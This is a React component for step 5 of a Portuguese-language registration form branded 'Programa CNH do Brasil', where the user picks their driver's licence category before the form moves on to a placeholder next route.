import { useMemo, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import "./StepCnh.css";

export default function StepCnh() {
  const location = useLocation();
  const navigate = useNavigate();
  const data = location.state;

  const [selected, setSelected] = useState("");

  const options = useMemo(
    () => [
      "Não Possuo CNH",
      "Possuo CNH Categoria A (moto)",
      "Possuo CNH Categoria B (carro)",
      "Possuo CNH Categoria AB ou Superior",
    ],
    []
  );

  if (!data) return <div className="step-loading">Carregando...</div>;

  const onConfirm = () => {
    if (!selected) return;

    // TROQUE "/stepfinal" para a próxima rota real do seu fluxo
    navigate("/stepfinal", {
      state: {
        ...data,
        cnhSelecionada: selected,
      },
    });
  };

  return (
    <div className="gov-page">
      <header className="gov-header">
        <div className="gov-header-inner">
          <div className="gov-brand">
            <img className="gov-logo" src="/logo.png" alt="Logo" />
            <div className="gov-brand-title">Programa CNH do Brasil</div>
          </div>
        </div>
      </header>

      <main className="gov-main">
        <section className="gov-card">
          <h2 className="gov-card-title">
            Confirme seus dados para o cadastro no Programa CNH do Brasil
          </h2>

          <div className="gov-step">
            <div className="step-circle">5</div>
            <div className="step-title">Qual sua situação atual de habilitação?</div>
          </div>

          <div className="option-list">
            {options.map((opt) => {
              const active = selected === opt;
              return (
                <button
                  key={opt}
                  type="button"
                  className={`option-item ${active ? "active" : ""}`}
                  onClick={() => setSelected(opt)}
                >
                  {opt}
                </button>
              );
            })}
          </div>

          <button
            type="button"
            className="confirm-btn"
            disabled={!selected}
            onClick={onConfirm}
          >
            Confirmar
          </button>
        </section>
      </main>
    </div>
  );
}